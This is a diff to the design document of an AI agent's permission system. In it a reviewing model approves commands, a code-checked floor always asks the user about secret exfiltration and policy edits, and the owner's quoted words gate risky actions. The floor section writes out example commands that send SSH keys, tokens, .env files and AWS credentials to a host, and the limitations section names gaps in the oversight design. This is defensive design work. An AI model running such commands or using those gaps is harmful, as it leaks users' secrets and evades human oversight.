@@ -1,10 +1,16 @@
 # Permission control (cypher-permissions)
 
-> **2026-10-20:** who approves a command outside the sandbox now depends on its risk tier
-> (inspect, local, dangerous), approvals of local work are kept per project, and
-> dangerous work always asks a human for at most the current task. See
-> [permission-friction.md](permission-friction.md); the sections below that it changes
-> (§3.5, §6.3, §7.2–7.5) are summarized there.
+> **Who decides** (2026-11-18, §7.3): the reviewing model decides nearly everything. A
+> command's risk tier comes from a deterministic classifier (`risk.ts`): an **inspection**
+> runs outside the sandbox without asking; **local** work goes to the model, wherever it
+> touches this machine; a **danger** (it reaches other people or shared systems, or cannot
+> be undone) runs on the model's approval only when the code confirms a fact of its own —
+> the owner's own words asking for exactly it (§7.3.2), or that it touches nothing but
+> what this task made itself (§7.3.3). Two things always ask the user, with no model and
+> no rule: a secret or credential leaving this machine, and a change to the permission
+> system's own files (§7.3.1). The earlier layering is in
+> [permission-friction.md](permission-friction.md); this document describes the design as
+> it stands.
 
 Status: **phases 0–4 implemented** (Runtime 1.1.0.2; off by default since 1.1.0.3; leaving the sandbox since 1.1.0.4, which needs Cypher 0.3.49; §10).
 
@@ -133,6 +139,29 @@ The shell must still read and execute the Runtime (its `bin/` directories are fi
 `PATH`), so self data is readable; only its secrets (§3.3) are not. A write needs a human:
 the judge must never approve an edit to its own policy. The list cannot be edited.
 
+A path this task made itself is exempt from the `protected` guard, never from `self`,
+`sensitive` or §3.6: a dev instance the chat started keeps its own Runtime under
+`~/.cypher-development/<instance>/pi-runtime`, and installing into it is the chat's own
+work (§7.3.3).
+
+### 3.6 The permission system's own files (always ask)
+
+Changing what permission control does next is never automatic: no rule, grant or
+reviewing model approves a write to these (`config.ts` `DEFAULT_PERMISSION_SYSTEM`,
+`permissionSystemPatterns`, `PathContext.isPermissionSystem`), whatever the owner wrote.
+Reading them is ordinary work: a diagnosis reads the audit log.
+
+- the policy: `<agent-dir>/permissions.json`, any instance's
+  `~/.cypher*/**/pi-runtime/agent/permissions.json`, `~/.pi/agent/permissions.json`, and a
+  project's `**/.pi/permissions.json`;
+- the settings that say which extensions load: `…/agent/settings.json`;
+- the extension's own code: `…/agent/extensions/**` and
+  `~/.cypher*/pi-runtime/versions/*/extensions/cypher-permissions*`;
+- the audit log and the judge's health file: `…/agent/permission-audit.jsonl`,
+  `…/agent/cypher-permissions/**`;
+- the session files an approval is restored from: `…/agent/sessions/**` (a chat grant and
+  the record of what the task made live there, so a forged line would be a grant).
+
 ## 4. Default permissions
 
 ### 4.1 File matrix (level `standard`)
@@ -202,7 +231,7 @@ the file is self-guarded). Every field is optional; lists take `{ "add": [], "re
     "tools": "assisted",
     "escalate": "assisted"
   },
-  "judge": { "model": null, "timeoutMs": 20000, "minConfidence": 0.8 },
+  "judge": { "model": null, "timeoutMs": 20000 },
   "ask": { "timeoutMs": null },
   "sensitive": { "add": [], "remove": [] },
   "protected": { "add": [], "remove": [] },
@@ -505,22 +534,27 @@ is unavailable on this device: …"). `/perm` shows the error.
 |---|---|
 | `deny` | Rejected at once; the agent is told the access is not available |
 | `ask` | A human decides |
-| `assisted` | The judge first. It has two answers: approve automatically (once), or ask the user. It never rejects |
+| `assisted` | The judge first. It has three answers: approve and remember for the chat, approve this call once, or ask the user. It never rejects |
 
 Safety rules:
 
-1. Writes to Cypher's own data never use the judge. Everything else, sensitive files and
-   commands outside the sandbox included, is `assisted` by default (2026-10-15: the model
-   judges first, so the user is asked only about what it cannot approve); the user's file
-   or Settings can set any kind back to `ask` or `deny`.
-2. The judge never rejects. Its only answers are `approve` and `ask-user`; anything but a
-   confident `approve` (unsure, low confidence, any other word, unreadable output, an
-   error, a timeout, no model available) asks the user, and the dialog says *"The
-   reviewing model could not approve this automatically: <reason>"*. The reason is also
-   recorded in the audit log (`reviewer`).
-3. Judge approvals are `once`. Only a human creates `chat` or `always` grants or command
-   rules; a command the judge ran outside the sandbox leaves none, and its result says
-   `approved once by the reviewing model`.
+1. Writes to Cypher's own data and to protected files never use the judge through the
+   file tools (there is no target its words could be checked against), and neither does
+   the always-ask floor (§7.3.1). Everything else, sensitive reads and commands outside the
+   sandbox included, is `assisted` by default (2026-10-15: the model judges first, so the
+   user is asked only about what it cannot approve); the user's file or Settings can set
+   any kind back to `ask` or `deny`.
+2. The judge never rejects. Its only answers are `approve`, `approve-once` and
+   `ask-user`, and its approval is the decision (D12). Anything but an approval
+   (`ask-user`, any other word, unreadable output, an error, a timeout, no model
+   available) asks the user, and the dialog says *"The reviewing model could not approve
+   this automatically: <reason>"*. The reason is also recorded in the audit log
+   (`reviewer`), with what the model answered (`judgeVerdict`). A danger needs more than
+   an approval: the code must confirm the owner's explicit request (§7.3.2).
+3. A judge `approve` of local work is kept for the chat (a file access as a `chat` grant;
+   a command as `chat` grants for its commands' own categories, never the agent's proposed
+   patterns); `approve-once` and any approval of a sensitive file or a danger keep nothing.
+   Only a human creates `always` grants or command rules.
 
 When several paths are requested together, the strictest mode wins.
 
@@ -533,25 +567,196 @@ When several paths are requested together, the strictest mode wins.
   tools, where it would otherwise refuse a system prompt the chat never recorded. A judge
   that fails says why in the dialog's Review row (the provider's error, or that it did
   not answer in time).
-- **Trusted input**: the user's last six messages, the request (capability: `read`,
-  `write`, `network`, `tool` or `escalate`; paths, zone, guard and why, tool, level,
-  workspace roots).
+- **Trusted input**: the conversation's last six user messages (the latest up to 12,000
+  characters, earlier ones up to 4,000; a longer one loses its middle, never its end,
+  since a long brief often puts the step at hand last), the request (capability:
+  `read`, `write`, `network`, `tool` or `escalate`; paths, zone, guard and why, tool,
+  level, workspace roots). For a danger, also the owner's own words (§7.3.2) and what the
+  command acts on as Cypher read it. When some user messages were written by an agent (a
+  plan's brief, an orchestrator's steering), the prompt says so: they count for local
+  development work only.
 - **Untrusted input**, fenced in `<untrusted>` (nested tags stripped): the command, a tool
   call's input, the agent's justification (for a command, its purpose and reason), its
   last eight tool calls, and the change for writes.
 - **What it asks the user about** (beyond anything the user did not ask for or that
   reaches further than needed): a protected write that could run code later; sending data
   off the machine; a sensitive file the user did not ask about by name or by what it
-  holds; a destructive or hard-to-undo command or tool call (deleting, overwriting,
-  force-pushing, publishing, deploying, sending messages, paying, killing processes,
-  changing system settings) the user did not ask for exactly; a host, account, repository
-  or service the user did not mention; downloading and running code; changing the
-  permission setup.
+  holds; a destructive or hard-to-undo command or tool call (deleting or overwriting what
+  this task did not make, force-pushing, publishing, deploying, sending messages, paying,
+  killing processes that are not its own, changing system settings) the user did not ask
+  for exactly; a host, account, repository or service the user did not mention;
+  downloading and running code; changing the permission setup.
 - **Never sent**: contents of files being read.
-- **Output**: `{"decision": "approve" | "ask-user", "reason", "confidence"}`. It approves
-  only on `approve` with confidence ≥ `judge.minConfidence` (0.8); a less confident
-  `approve` asks the user ("Not sure enough to approve on its own: …"). Timeout 20 s.
+- **What serves the request**: doing and checking the development work the user asked
+  for, wherever it lives, inside the project folders or outside them: reading anything on
+  this machine the work needs to be understood (other checkouts, logs, caches, and the
+  installed app's own logs and data when the report is about it); building and testing it
+  (scripts that download the project's pinned dependencies included) in `/tmp` or any
+  worktree; making and tidying its own scratch space (worktrees it adds, branches it
+  creates, clones and copies in `/tmp`, its `target/` directories); the chat's own private
+  dev instance (`~/.cypher-development/<instance>`, run from its worktree), including
+  stopping the processes it started; screenshots and read-only window or app queries;
+  read-only process checks (`ps`, `lsof`, `sample`, `lsappinfo info`); read-only requests
+  to a server (fetching a page or a release file, `gh run view`, `gh api` without a field
+  or a write method). In a plan's background session the brief's steps count as the
+  user's request for this local work, never for a danger (§7.3.2). Never writing to,
+  deleting in or restarting the installed app, other chats' worktrees or dev instances, or
+  anything that carries data off the machine. The prompt also lists what this task made
+  (§7.3.3), so the model never has to take the agent's word for it.
+- **Output**: `{"decision": "approve" | "approve-once" | "ask-user", "reason"}`, and for
+  an approved danger `"userQuote"` and `"target": {"kind", "value"}` (§7.3.2). Two
+  outcomes follow: `approve` or `approve-once` runs the call, `ask-user` puts it to the
+  user with the reason. `approve-once` runs the call and keeps nothing: the answer when
+  the call is fine but the patterns an approval would keep for the chat are too broad
+  (`cypher …`, `lsappinfo …`, a script the agent wrote); that alone is never a reason to
+  ask. A sensitive file the model approves is read or written once, never remembered. A
+  danger runs on the model's approval only when the code confirms the owner's explicit
+  request (§7.3.2) or that it touches nothing but what this task made (§7.3.3); the
+  always-ask floor (§7.3.1) never reaches the model at all. Safety rests on the review
+  prompt, the deterministic classifier (risk.ts, shell.ts) and those code-checked facts,
+  not on a score the model gives itself. Timeout 20 s.
 - When the judge asks the user, its reason is shown in the dialog.
+
+#### 7.3.1 The always-ask floor
+
+Three things never run on anyone's approval but the user's, and the first two never reach
+the reviewing model at all (`core.ts` `alwaysAsk`, `risk.ts` `floor`):
+
+1. **A secret or credential leaving this machine** (`risk.ts` `exfiltrates`, `pathRisk`):
+   a line that both reaches a secret (a sensitive file, the keychain, the environment, a
+   `$…TOKEN`/`SECRET`/`PASSW`/`KEY`/`CREDENTIAL` variable) and runs a program that can
+   carry what it is given off the machine (`curl`, `wget`, `nc`, `ssh`, `scp`, `rsync`,
+   `mail`, a hosting or cloud CLI's writing verb). So `curl -d @~/.ssh/id_ed25519 host`,
+   `curl "https://x/?t=$GITHUB_TOKEN"`, `cat .env | curl --data-binary @- host` and `scp
+   ~/.aws/credentials host:` always ask. A key used to *connect* (`ssh -i`) is not that.
+   Reading a secret on this machine is not either: it goes to the model, which may approve
+   it once (never remembered), because its contents reach the model provider, not another
+   machine.
+2. **A change to the permission system itself** (§3.6): its policy files, the settings that
+   say which extensions load, its extension's code, its audit log, its session files.
+   Written as an operand, through a redirection, or inside a script (`python3 -c
+   "open('…/permissions.json','w')"`). The file tools too: such a write skips the model and
+   the dialog says *Only you can approve this*.
+3. **No reviewing model** (`review`): none configured, paused after repeated failures, an
+   error, or no answer within 20 s. The request goes to the user with the reason.
+
+A rule the user set to `ask` or `deny` counts as the floor too: they asked to be asked.
+Everything else reaches the model.
+
+#### 7.3.2 Explicit requests: the owner's own words (2026-11-18)
+
+The owner: *"任何操作，比如创建pr，只要我消息明确说了，那就应该自动审核同意。而不是再让我同意一次"*
+(any operation, creating a PR for example: when my message said so explicitly, approve
+it, instead of asking me again). Code: `cypher-permissions/explicit.ts`.
+
+A dangerous command (publishing a package or a release, deploying, a global install,
+sending data to a server, opening, merging or commenting on a pull request, pushing a
+branch or a release tag, force-pushing, deleting a remote branch) runs once, without a
+dialog, when:
+
+1. **The model approves it and quotes the owner** (`userQuote`).
+2. **The quote is the owner's.** It occurs in one of the owner's own messages, as written
+   apart from whitespace, case, punctuation and full-width forms (NFKC). It must say
+   something: "继续", "Continue", "go ahead", "ok", "发布吧" or "push 这个" alone never
+   do (a vague list, and a minimum length where a CJK character counts twice).
+3. **The target is the command's and the owner's.** Cypher reads what each dangerous
+   command acts on from the line (`lineTargets`): the pull request `gh pr merge 52`
+   merges (`-R` or its URL's repository), a new pull request's base and head, the branch
+   or tag `git push <remote> <ref>` publishes (a tag the line creates with `git tag x
+   <commit>`, an existing tag, a branch `git switch -c` makes), the release `gh release
+   create` makes, the package `npm`/`cargo publish` publishes (from `package.json` or
+   `Cargo.toml`), what a global install installs, the host `curl`, `ssh`, `scp` or
+   `rsync` reach. The model's `target` must be one of them, and the owner's message
+   holding the quote must ask for the action ("merge", "合并", "push", "推", "release",
+   "发布", "publish", "install", a PR) and name the target or plainly imply it:
+   - the pull request's number (`#52`, `PR 52`, `/pull/52`); without one, a message
+     asking to open a PR and merge it covers the one this chat opened (a `gh pr create`
+     whose result names exactly that pull request). A message naming #52 never covers #53;
+   - the branch by name (`main` in "pr 给main");
+   - the tag by name, or its version ("0.4.5"); or, for "release a new version" ("最新的
+     main代码发布全新版本吧"), a tag whose commit is on the remote's default branch (as last
+     fetched) and whose files hold the tag's version (`git grep -F -w`). A message naming
+     another version never covers it;
+   - the package's name or version; the host's name;
+   - a remote other than `origin`, or a repository other than the checkout's origin, by
+     name.
+4. **Nothing since takes it back.** Every message the owner wrote after it must carry on
+   ("好了 继续发布", "try again", one naming the same target): a retraction ("先别 push",
+   "不要合并", "wait", "cancel", "instead") or a message about something else makes the
+   request stale, so it asks.
+
+Still asked, whatever the model says: the always-ask floor (§7.3.1), checked first; a
+target known only when the line runs (`git push origin $BRANCH`, `gh pr merge $(…)`, a
+`gh pr merge` that names no pull request, a tag pushed from a loop, a line rules can't
+read); and a danger whose target Cypher reads no name for, because the owner's words
+could not name it either — a pid a `kill` stops, a file a `rm` deletes, the installed
+app's data a program is pointed at, `gh api` writes, a package `npx` downloads and runs.
+Words known only when the line runs are fine where they don't change the target: a pull
+request's `--body "$(cat …)"`, a title from a variable, a heredoc body, `--body-file`. The
+audit records each explicit decision (`explicit`: `ok`, the quote and whether it came from
+a typed message or a plan's instruction, the targets, which checks passed, or why not),
+and the dialog's Review row says why a quoted request wasn't confirmed.
+
+**Only the owner's words count.** The engine passes them in `CYPHER_OWNER_WORDS`, an
+environment variable the harness sets when it spawns Pi (`crates/harness/src/pi/spawn.rs`,
+beside `CYPHER_PERMISSION_LEVEL`): JSON `{"messages": [{"text", "source": "typed" |
+"plan"}], "agentWritten"}`, at most ten messages of 2,000 characters, 12,000 in all. A
+running agent can't change its own process's environment. The words come from the chat's
+command ledger, not from Pi's conversation, where agents' messages sit as user messages:
+
+- Every message command says who wrote it when no person did
+  (`SessionCommandEntry::author`, signed with the entry): `plan` for a plan's brief and the
+  prompts its background session starts and steers sessions with, `subagent` for a parent
+  chat's task, `routine`, `peer` (another person's workspace), `memory`. Only the
+  engine's own callers set it (`DocHost::queue_agent_command`); the RPC surface the UI and
+  agents use can't. Entries written before it existed are told by their message ids
+  (`*-brief`, `peer-*`, `bot-answer-*`) and, in a chat an agent started (a plan's session or
+  thread, a subagent, a workspace thread other than the owner's chat, a memory pass), by
+  being its first message.
+- A person's message counts once its host took it for execution (applied, or pending and
+  in the processed ledger); a rejected, expired or superseded one never does.
+- A plan's sessions and its background thread also get the owner's instruction from the
+  plan's record (`BotWork::instruction`, the owner's message it was proposed from,
+  capped at 1,500 characters), first. What the owner types into such a session counts
+  too; the start prompt, `steer_session` and `answer_session` (an answer, not a message)
+  never do.
+
+Without the variable (an older Cypher, or Pi started by hand), no danger runs on an
+explicit request.
+
+#### 7.3.3 What this task made (2026-11-18)
+
+The other fact a danger may run on: the action touches nothing but what this task made
+itself. Cypher records that from the commands the chat actually ran, not from what the
+model says (`cypher-permissions/created.ts`):
+
+- Every bash call the extension lets through — in the sandbox or outside it — is read by
+  the shell reader, and what it creates is recorded (`noteCreated`, `creationsOf`): the
+  path and branch of a `git worktree add`, a branch from `git switch -c` / `checkout -b` /
+  `git branch <name>`, a `git clone`'s directory, the operands of `mkdir`, `install -d`,
+  `touch` and `tee`, a copy's destination, the files its redirections write, and the data
+  directories of a dev instance it names (`CYPHER_DEV_INSTANCE=<name>` →
+  `~/.cypher-development/{local,dev}-{engine,ui}-<name>` and their logs, or
+  `CYPHER_DATA_DIR=<path>` under `~/.cypher-development`). Never the whole
+  `~/.cypher-development`: other chats keep their instances there.
+- Nothing sensitive, protected, Cypher's own, the installed app's or the permission
+  system's is ever recorded, however it was created (`recordable`), so a write the owner
+  approved once can never become a free hand to delete it later.
+- The record is kept with the chat, like a grant (session entries
+  `cypher-permissions.created`, tagged with the chat id, bounded), so it holds across the
+  turns of one chat and never crosses into another.
+- The chat's own workspace roots and the temp directories count as its own anyway
+  (`disposable`), and so does the branch checked out in a workspace root, which is the
+  work Cypher gave the chat (`workspaceBranches`, never a default branch).
+
+What that makes local work instead of a danger (`risk.ts` `facts.created`): `git worktree
+remove` of a worktree it added, `git branch -D` of a branch it created or is working on,
+`rm -rf`, `mv` and `chmod -R` of a directory or file it made (its dev instance, its
+`target/`, its clones and scratch files), `git reset --hard` / `checkout --` / `clean -f`
+in a checkout it made, `kill` of processes running in it or using it as their data
+directory (`processFacts.inCreated`), and a write under its dev instance's own Runtime
+directory. Anything else — another chat's worktree, a branch it did not make, a path it
+never created — stays a danger and asks.
 
 ### 7.4 Human approval
 
@@ -685,6 +890,11 @@ switches), never from another chat or a terminal; keys within 500 ms of the card
 and held-key repeats are ignored, so typing into the composer as a request arrives never
 answers it.
 
+An escalation's record may carry `explicit` (§7.3.2): whether a danger ran as the owner's
+explicit request, or why only the user can approve it (the always-ask floor, §7.3.1); the
+words the model quoted and whether they were typed or a plan's instruction, what the line
+acts on, which checks passed (`quote`, `target`, `current`), or why not.
+
 Commands:
 
 - `/perm`: level, sandbox, workspace roots, defaults, approval modes, grants, command
@@ -707,6 +917,10 @@ Commands:
 | `cypher-permissions/discover.ts` | Concrete paths for Landstrip; the home index |
 | `cypher-permissions/sandbox.ts` | Landstrip status, policy compiler, wrapper, env scrub, denial events |
 | `cypher-permissions/judge.ts` | Judge prompt and verdict parsing |
+| `cypher-permissions/risk.ts`, `packs.ts` | The risk classifier: an action's tier, the always-ask floor, what each program does |
+| `cypher-permissions/created.ts` | What this task made, read from the commands it ran: the facts a danger over its own leavings rests on (§7.3.3) |
+| `cypher-permissions/explicit.ts` | Explicit requests: the owner's words, what a dangerous line acts on, the quote, target and retraction checks (§7.3.2) |
+| `crates/engine/src/host/doc_host/owner_words.rs` | The owner's words from a chat's command ledger (`CYPHER_OWNER_WORDS`); `SessionCommandEntry::author` marks agents' messages |
 | `cypher-permissions/audit.ts` | The audit log |
 | `cypher-permissions/shell.ts` | Reading a command line into every command it can run and the files it redirects, or opaque |
 | `cypher-permissions/commands.ts` | Command rules: patterns, validation, the banned programs, categories, resolving a program |
@@ -715,14 +929,23 @@ Commands:
 | `crates/ui/src/composer/slash_menu.rs`, `slash.rs` | `/permissions` in the composer's `/` menu |
 | `crates/ui/src/pickers/` (`PERMISSION_LEVELS`, `PickerKind::Permissions`) | The level names; the Full access shield and its menu |
 
-Tests: `cypher-permissions.test.mjs` (engine, no Pi or Landstrip) and
+Tests: `cypher-permissions.test.mjs` (engine, no Pi or Landstrip),
+`cypher-permissions-replay.test.mjs` (every question that reached the owner in the week
+from 2026-11-11, sanitized in `cypher-permissions-replay/`, replayed through the
+classifier and the decision path with the judge's verdict stubbed per case; the
+explicit-request cases carry the owner's words and adversarial probes that must still
+ask; `cypher-permissions-replay/harness.mjs` is its fake machine, and
+`cypher-permissions-replay/live.mjs`, run by hand and never by `npm test`, puts the same
+cases and probes through the real reviewing model, as claude-bridge calls it, with each
+case's conversation from a context file kept outside the repository) and
 `cypher-permissions.staged.test.mjs` (a real `bin/pi` in RPC mode from a staged Runtime,
 a scripted faux model that also answers as the judge, the real Landstrip, the patched
 grep and apply_patch, dialogs answered over RPC). The package script runs both on macOS and Linux builds; the
 staged suite skips its sandbox cases where `landstrip doctor` fails. Rust:
 `pi::permissions` (the settings file merge), `tests/chat_permission_level.rs` (the row's
-level wins), the harness's `CYPHER_PERMISSION_LEVEL` test, and the picker and Settings
-page unit tests.
+level wins), the harness's `CYPHER_PERMISSION_LEVEL` and `CYPHER_OWNER_WORDS` tests,
+`host::doc_host::owner_words` and `tests/bot_work.rs` (a plan's runs carry the owner's
+words, never the brief or steering), and the picker and Settings page unit tests.
 
 ## 10. Phases
 
@@ -778,6 +1001,13 @@ page unit tests.
   after the policy was compiled (within 1.5 s).
 - **Hard links into the workspace** of external files: Landstrip blocks links to denied
   paths; linking other external files is not restricted.
+- **Explicit requests** (§7.3.2): the owner's words reach Pi when its turn starts, so a
+  message the owner steers into a running turn counts from the next turn. A forked chat
+  starts without its source's commands, so without its words. A process outside the
+  sandbox that can reach the engine's socket could queue a message as the owner; the
+  socket of the installed app is under `~/.cypher`, which only a human may let a command
+  touch. Old message commands of a plan's session that an older orchestrator steered carry
+  no author and count as the owner's.
 
 ## 12. Decisions and open questions
 
@@ -806,6 +1036,27 @@ Decided (2026-10-11):
   remembered for the chat) and is kept per project when a human approves it, dangerous
   work (and protected writes) always asks a human, for the task at most. D10's "model
   first" now excludes dangerous work.
+- **D12.** (2026-11-18) The judge answers `approve`, `approve-once` or `ask-user`, with no
+  confidence score and no bar to clear: its approval is the decision, for local work and
+  sensitive files alike (a sensitive file once, never remembered), and anything else asks
+  the user. A `judge.minConfidence` key in the user's file is ignored. A danger also needs
+  the owner's explicit request, checked by the code (D13).
+- **D13.** (2026-11-18) A danger the owner's own words explicitly ask for runs once
+  without a dialog when the model approves it and the code confirms the model's quote and
+  target (§7.3.2); without that confirmation it always asks. Only words a person wrote
+  count, passed by the engine in `CYPHER_OWNER_WORDS`; agents' messages are marked in the
+  command ledger.
+
+- **D14.** (2026-11-18) The reviewing model decides nearly everything, and the floor is
+  small (§7.3.1): local work is the model's wherever it touches this machine (reads
+  anywhere, builds and tests, worktrees, `/tmp`, the chat's own dev instance, reading the
+  installed app's data for a diagnosis, read-only GETs and window queries), and a danger
+  runs on a fact the code checks — the owner's words (D13) or that it only touches what
+  this task made (§7.3.3, recorded from the commands the chat ran). A secret leaving the
+  machine and a change to the permission system's own files always ask, as does an
+  unavailable reviewing model. Reading a secret here is local work the model may approve
+  once, never remembered (the owner chose this on 2026-11-18); `~/.cypher*/**/sessions/**`
+  and `settings.json` were added to the floor on the owner's answer the same day.
 
 Open:
 
